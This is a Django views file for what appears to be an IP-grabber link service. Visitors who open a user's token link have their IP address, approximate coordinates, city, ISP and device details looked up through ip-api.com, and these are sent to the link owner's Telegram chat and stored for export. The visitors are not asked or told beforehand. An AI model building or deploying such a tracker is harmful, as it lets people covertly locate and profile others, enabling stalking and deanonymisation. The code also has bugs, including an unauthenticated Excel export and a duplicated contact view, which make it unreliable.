import json
import os
import requests
from django.http import HttpResponse
from django.shortcuts import redirect,render
from django.contrib.auth.decorators import login_required
from datetime import  datetime
from .forms import *
from .models import *
import xlwt
import pytz
import csv
from django.core.paginator import Paginator
from user_agents import parse




def home(request):
    return render(request,'home.html')

##################### User track and send data start  ###########################    
@login_required
def user_track(request):
    # Get the visit count, today's total, monthly total, and yearly total for the authenticated user
    visit, created = VisitCount.objects.get_or_create(author=request.user)
    visit_count = visit.visit_count
    today_total = visit.today_total
    monthly_total = visit.monthly_total
    yearly_total = visit.yearly_total
    
    # Fetch user location data ordered by date and time (descending)
    user_location_data = UserLocation.objects.filter(author=request.user).order_by('-date', '-time')

    # Paginate user location data
    paginator = Paginator(user_location_data, 10)  # 10 items per page
    page_number = request.GET.get('page')
    page_obj = paginator.get_page(page_number)

    if request.user.is_authenticated:
        # If the user is authenticated, render the 'user_track.html' template with pagination
        return render(request, 'user_track.html', {
            'userdata': page_obj,
            'visit_count': visit_count,
            'today_total': today_total,
            'monthly_total': monthly_total,
            'yearly_total': yearly_total
        })
    else:
        # If the user is not authenticated, redirect to the home page
        return redirect('home')



def send_location(request, token):
    # Get the user agent of the browser
    user_agent_string = request.META.get('HTTP_USER_AGENT', '')
    user_agent = parse(user_agent_string)

    # Check if the provided token exists in the database
    if not TokenSummary.objects.filter(token=token).exists():
        return HttpResponse("Invalid token")

    # Get the user's submitted chat ID from the database
    token_summary = TokenSummary.objects.get(token=token)
    chat_id = token_summary.chat_id

    # Get the user associated with the token, which is used to get the user's track record
    author = token_summary.author

    # Create a new Visit object using the create_visit function
    create_visit(author)

    # Get the user's visit count, today's total, monthly total, and yearly total
    visit_count = VisitCount.objects.get(author=author).visit_count
    today_total = VisitCount.objects.get(author=author).today_total
    monthly_total = VisitCount.objects.get(author=author).monthly_total
    yearly_total = VisitCount.objects.get(author=author).yearly_total

    # Get the user's IP address
    ip = request.META.get('HTTP_X_FORWARDED_FOR', request.META['REMOTE_ADDR'])
    if ip is not None:
        # If the user is accessing the website through a proxy, get the first IP address in the list
        ip = ip.split(",")[0]

    # Use the 'ip-api.com' API to get the user's location
    # Note: The fields parameter specifies which fields to include in the response
    ip_url = f"http://ip-api.com/json/{ip}?fields=continent,country,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,asname,mobile,proxy,hosting,query"
    ip_response = requests.get(ip_url)

    # Parse the response and extract the user's location
    ip_data = json.loads(ip_response.text)

    # Ensure latitude and longitude have default values if not present in ip_data
    latitude = ip_data.get("lat", 0.0)
    longitude = ip_data.get("lon", 0.0)

    # Extract other location and user agent data
    continent = ip_data.get("continent", "")
    country = ip_data.get("country", "")
    region = ip_data.get("region", "")
    region_name = ip_data.get("regionName", "")
    city = ip_data.get("city", "")
    district = ip_data.get("district", "")
    zip_code = ip_data.get("zip", "")
    timezone = ip_data.get("timezone", "")
    isp = ip_data.get("isp", "")
    org = ip_data.get("org", "")
    as_number = ip_data.get("as", "")
    as_name = ip_data.get("asname", "")
    mobile = ip_data.get("mobile", "")
    proxy = ip_data.get("proxy", "")
    hosting = ip_data.get("hosting", "")
    ip_address = ip_data.get("query", "")

    # Construct a formatted message for Telegram
    message = "📍 **Location Details** 📍\n"
    message += f"🌐 **IP Address:** {ip_address}\n"
    message += f"🌍 **Coordinates:** [{latitude}, {longitude}]\n"
    message += f"🌏 **Continent:** {continent}\n"
    message += f"🌎 **Country:** {country}\n"
    message += f"🏞️ **Region:** {region} ({region_name})\n"
    message += f"🏙️ **City:** {city}\n"
    message += f"🏡 **District:** {district}\n"
    message += f"🏢 **ZIP Code:** {zip_code}\n"
    message += f"🕒 **Time Zone:** {timezone}\n"
    message += f"🌐 **ISP:** {isp}\n"
    message += f"🏢 **Organization:** {org}\n"
    message += f"🔢 **AS Number:** {as_number} ({as_name})\n"
    message += f"📱 **Mobile:** {mobile}\n"
    message += f"🚫 **Proxy:** {proxy}\n"
    message += f"🌐 **Hosting:** {hosting}\n"
    message += f"🗺️ **Google Maps:** [View on Google Maps](https://www.google.com/maps/@{latitude},{longitude})\n"

    message += f"\n**User Agent Information**\n"
    message += f"🌐 **Browser:** {user_agent.browser.family} {user_agent.browser.version_string}\n"
    message += f"💻 **Operating System:** {user_agent.os.family}\n"
    message += f"📱 **Device:** {user_agent.device.family}\n"
    message += f"📱 **Is Mobile:** {'Yes' if user_agent.is_mobile else 'No'}\n"
    message += f"💼 **Is Tablet:** {'Yes' if user_agent.is_tablet else 'No'}\n"
    message += f"🖥️ **Is PC:** {'Yes' if user_agent.is_pc else 'No'}\n"
    message += f"🤖 **Is Bot:** {'Yes' if user_agent.is_bot else 'No'}\n"

    # Get the current time
    current_time = datetime.now()
    message += f"\n🕒 **Time:** {current_time.strftime('%I:%M %p')}\n"
    message += f"📅 **Date:** {current_time.strftime('%d/%m/%Y')}\n"

    # Include the user's visit count statistics
    message += f"\n**Visit Statistics**\n"
    message += f"📈 **Visits Today:** {today_total}\n"
    message += f"📆 **Visits This Month:** {monthly_total}\n"
    message += f"📅 **Visits This Year:** {yearly_total}\n"
    message += f"📊 **Total Visits:** {visit_count}\n"

    # Send the message to the user's chat ID
    chat_id = token_summary.chat_id
    bot_token = os.environ['BOT_TOKEN']
    send_message_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    send_message_data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown",  # Use Markdown for better formatting
        "disable_web_page_preview": True,  # Disable web page previews
    }
    response = requests.post(send_message_url, data=send_message_data)

# Use the get method to retrieve the values from the ip_data dictionary, and specify a default value if the key is not present 
    ip_address = ip_data.get("query", "")
    latitude = ip_data.get("lat", 0)
    longitude = ip_data.get("lon", 0)
    continent = ip_data.get("continent", "")
    country = ip_data.get("country", "")
    region = ip_data.get("region", "")
    region_name = ip_data.get("regionName", "")
    city = ip_data.get("city", "")
    district = ip_data.get("district", "")
    zip_code = ip_data.get("zip", "")
    timezone = ip_data.get("timezone", "")
    isp = ip_data.get("isp", "")
    org = ip_data.get("org", "")
    as_number = ip_data.get("as", "")
    as_name = ip_data.get("asname", "")
    mobile = ip_data.get("mobile", "")
    proxy = ip_data.get("proxy", "")
    hosting = ip_data.get("hosting", "")
    if "lat" in ip_data and "lon" in ip_data:
        lat = ip_data["lat"]
        lon = ip_data["lon"]
        map_link = f"https://www.google.com/maps/@{lat},{lon}"
    else:
        map_link = ""

    user_location = UserLocation(
        author=author,
        latitude=latitude,
        longitude=longitude,
        continent=continent,
        country=country,
        region=region,
        region_name=region_name,
        city=city,
        district=district,
        zip_code=zip_code,
        timezone=timezone,
        isp=isp,
        org=org,
        as_number=as_number,
        as_name=as_name,
        mobile=mobile,
        proxy=proxy,
        hosting=hosting,
        ip_address=ip_address,
        map_link=map_link,
        user_agent=user_agent, 
        user_agent_browser_family=user_agent.browser.family,
        user_agent_browser_version=user_agent.browser.version_string,
        user_agent_os=user_agent.os.family,
        user_agent_device=user_agent.device.family,
        is_mobile=user_agent.is_mobile,
        is_tablet=user_agent.is_tablet,
        is_pc=user_agent.is_pc,
        is_bot=user_agent.is_bot,   
    )
    # Save the UserLocation object to the database
    user_location.save(request)

    # Return a response indicating that the location details have been successfully sent
    return HttpResponse("Location details sent to Telegram successfully.")

@login_required
def token_summary(request):
    
    # Retrieve the authenticated user's 'TokenSummary' object
    token_summary = TokenSummary.objects.filter(author=request.user)

    # Query the TokenSummary model to get all the tokens that have been generated by the user
    tokens = TokenSummary.objects.filter(author=request.user)
    os.environ['SERVER_ADDRESS']

    # Check if the request method is POST
    if request.method == "POST":
        # Check if the user has already submitted a chat ID
        if TokenSummary.objects.filter(author=request.user).exists():
            # If the user has already submitted a chat ID, update it
            token_summary = TokenSummary.objects.get(author=request.user)
            token_summary.chat_id = request.POST["chat_id"]
            token_summary.save()
        else:
            # If the user has not submitted a chat ID, create a new record
            TokenSummary.objects.create(
                author=request.user, chat_id=request.POST["chat_id"]
            )
            
        # Redirect the user to the home page
        return redirect("token_summary")

    # Check if the user has submitted a chat ID
    if TokenSummary.objects.filter(author=request.user).exists():
    # If the user has submitted a chat ID, show the current chat ID
        token_summary = TokenSummary.objects.filter(author=request.user).first()
    else:
        # If the user has not submitted a chat ID, show an empty string
        token_summary = ""
    
    # Add the SERVER_ADDRESS environment variable to the context dictionary
    context = {
        "chat_id": token_summary.chat_id,
        'token_summary': token_summary,
        'tokens': tokens,
        'SERVER_ADDRESS': os.environ['SERVER_ADDRESS'],
    }
    # Render the token_summary.html template and pass the token_summary and tokens objects as context variables
    return render(request, 'token_summary.html', context)


def create_visit(author):
    
    try:
        # Get the track record for the authenticated user
        visit = VisitCount.objects.get(author=author)
    except VisitCount.DoesNotExist:
        # If the object does not exist, create a new one
        visit = VisitCount.objects.create(author=author)

    # Get the current date and time
    current_date = datetime.now().date()
        
    # Increment the total visit count
    visit.visit_count += 1

    # Check if the day has changed since the last visit
    if visit.last_visit_date.day != current_date.day:
        # If the day has changed, reset the daily visit count
        visit.today_total = 0
    # Increment the daily visit count
    visit.today_total += 1

    # Check if the month has changed since the last visit
    if visit.last_visit_date.month != current_date.month:
        # If the month has changed, reset the monthly visit count
        visit.monthly_total = 0
    # Increment the monthly visit count
    visit.monthly_total += 1

    # Check if the year has changed since the last visit
    if visit.last_visit_date.year != current_date.year:
        # If the year has changed, reset the yearly visit count
        visit.yearly_total = 0
    # Increment the yearly visit count
    visit.yearly_total += 1

    # Update the last visit date
    visit.last_visit_date = current_date

    # Save the updated visit count to the database
    visit.save()

############## User track and send data start  ##############

##################### Data export start #####################



@login_required
def export_csv(request):
    # Get the user locations of the currently logged-in user
    user_locations = UserLocation.objects.filter(author=request.user)

    # Create the HttpResponse object with the appropriate CSV header
    response = HttpResponse(content_type='text/csv')
    response['Content-Disposition'] = 'attachment; filename="user_locations.csv"'

    # Create the CSV writer
    writer = csv.writer(response)

    # Define the desired order of header names
    header_order = [
        'date', 'time', 'latitude', 'longitude', 'continent', 'country',
        'region', 'region_name', 'city', 'district', 'zip_code', 'timezone',
        'isp', 'org', 'as_number', 'as_name', 'mobile', 'proxy', 'hosting',
        'ip_address', 'map_link', 'user_agent',
        'user_agent_browser_family', 'user_agent_browser_version',
        'user_agent_os', 'user_agent_device',
        'is_mobile', 'is_tablet', 'is_pc', 'is_bot'
    ]

    # Write the header row with the custom arrangement
    writer.writerow(header_order)

    # Write the data rows
    for user_location in user_locations:
        row_data = [getattr(user_location, field) for field in header_order]
        writer.writerow(row_data)

    # Return the response
    return response



@login_required
def export_json(request):
    # Get the user locations of the currently logged-in user
    user_locations = UserLocation.objects.filter(author=request.user)

    # Create a list to store the serialized data
    data = []

    # Serialize the user location data for each location
    for location in user_locations:
        location_data = {
            'date': location.date.strftime("%d/%m/%Y"),
            'time': location.time.strftime("%H:%M:%S"),
            'latitude': location.latitude,
            'longitude': location.longitude,
            'continent': location.continent,
            'country': location.country,
            'region': location.region,
            'region_name': location.region_name,
            'city': location.city,
            'district': location.district,
            'zip_code': location.zip_code,
            'timezone': location.timezone,
            'isp': location.isp,
            'org': location.org,
            'as_number': location.as_number,
            'as_name': location.as_name,
            'mobile': location.mobile,
            'proxy': location.proxy,
            'hosting': location.hosting,
            'ip_address': location.ip_address,
            'map_link': location.map_link,
            'user_agent': location.user_agent,
            'user_agent_browser_family': location.user_agent_browser_family,
            'user_agent_browser_version': location.user_agent_browser_version,
            'user_agent_os': location.user_agent_os,
            'user_agent_device': location.user_agent_device,
            'is_mobile': location.is_mobile,
            'is_tablet': location.is_tablet,
            'is_pc': location.is_pc,
            'is_bot': location.is_bot,
        }
        data.append(location_data)

    # Serialize the list of data as JSON
    json_data = json.dumps(data, indent=4)  # Add indentation for readability

    # Create the HttpResponse object with JSON data
    response = HttpResponse(json_data, content_type='application/json')
    response['Content-Disposition'] = 'attachment; filename=user_locations.json'
    
    # Return the response
    return response

import pytz
from .models import UserLocation
from django.http import HttpResponse
import xlwt
from .models import UserLocation

def export_excel(request):
    response = HttpResponse(content_type='application/ms-excel')
    response['Content-Disposition'] = 'attachment; filename=user_locations.xls'

    wb = xlwt.Workbook(encoding='utf-8')
    ws = wb.add_sheet('UserLocations')

    # Sheet header, first row
    row_num = 0

    font_style = xlwt.XFStyle()
    font_style.font.bold = True

    # Get all field names from the UserLocation model
    fields = UserLocation._meta.get_fields()

    # Define the order of columns and their corresponding labels
    column_order = [
        ('date', 'Date'),
        ('time', 'Time'),
        ('latitude', 'Latitude'),
        ('longitude', 'Longitude'),
        ('continent', 'Continent'),
        ('country', 'Country'),
        ('region', 'Region'),
        ('region_name', 'Region Name'),
        ('city', 'City'),
        ('district', 'District'),
        ('zip_code', 'Zip Code'),
        ('timezone', 'Timezone'),
        ('isp', 'ISP'),
        ('org', 'Organization'),
        ('as_number', 'AS Number'),
        ('as_name', 'AS Name'),
        ('mobile', 'Mobile'),
        ('proxy', 'Proxy'),
        ('hosting', 'Hosting'),
        ('ip_address', 'IP Address'),
        ('map_link', 'Map Link'),
        ('user_agent', 'User Agent'),
        ('user_agent_browser_family', 'User Agent Browser Family'),
        ('user_agent_browser_version', 'User Agent Browser Version'),
        ('user_agent_os', 'User Agent OS'),
        ('user_agent_device', 'User Agent Device'),
        ('is_mobile', 'Is Mobile'),
        ('is_tablet', 'Is Tablet'),
        ('is_pc', 'Is PC'),
        ('is_bot', 'Is Bot'),

    ]

    # Write the column labels to the first row
    for col_num, (field_name, column_label) in enumerate(column_order):
        ws.write(row_num, col_num, column_label, font_style)

    # Sheet body, remaining rows
    font_style = xlwt.XFStyle()

    user_locations = UserLocation.objects.filter(author=request.user).order_by('-date', '-time')

    for location in user_locations:
        row_num += 1
        row = [
            str(getattr(location, field_name))
            if getattr(location, field_name) is not None
            else ""
            for field_name, _ in column_order
        ]

        for col_num, value in enumerate(row):
            ws.write(row_num, col_num, value, font_style)

    wb.save(response)
    return response


##################### Data export end #####################

#################### contact form #########################

def contact(request):
    return render(request,'contacts.html')

def contact(request):
    if request.method == 'POST':
        form = ContactForm(request.POST)
        if form.is_valid():
            return from_contact(form)
    else:
        form = ContactForm()
    return render(request, 'contacts.html', {'form': form})


# TODO Rename this here and in `contact`
def from_contact(form):
    # Get the name and email fields from the form
    name = form.cleaned_data['name']
    email = form.cleaned_data['email']
    message = form.cleaned_data['message']

    # Create a new ContactFormData instance and save it to the database
    form_data = ContactFormData(name=name, email=email, message=message)
    form_data.save()

    # Get the current date and time
    now = datetime.now()

    # Format the date and time as a string
    time = now.strftime("%H:%M:%S")
    date = now.strftime("%m/%d/%Y")
    
    # Define emojis for different elements of the message
    emoji_new = "🆕"  # New
    emoji_person = "👤"  # Person
    emoji_email = "📧"  # Email
    emoji_message = "📝"  # Message
    emoji_calendar = "🗓️"  # Calendar
    emoji_clock = "🕒"  # Clock
    emoji_tag = "🏷️"  # Tag
    
    # Create a formatted message using HTML
    text = f'<b>{emoji_new} New Contact Form Submission</b>\n\n' \
           f'{emoji_person} <b>Name:</b> {name}\n' \
           f'{emoji_email} <b>Email:</b> {email}\n' \
           f'{emoji_message} <b>Message:</b> {message}\n' \
           f'{emoji_calendar} <b>Date:</b> {date}\n' \
           f'{emoji_clock} <b>Time:</b> {time}\n\n' \
           f'{emoji_tag} <i>#ContactForm</i>'

    # Send the message to the Telegram chat using the bot API
    chat_id = os.environ['CHAT_ID']
    bot_token = os.environ['BOT_TOKEN']
    requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', data={'chat_id': chat_id, 'text': text, "parse_mode": "html",})

    # Redirect the user to the contact page
    return redirect('contact')

#################### contact form end ####################

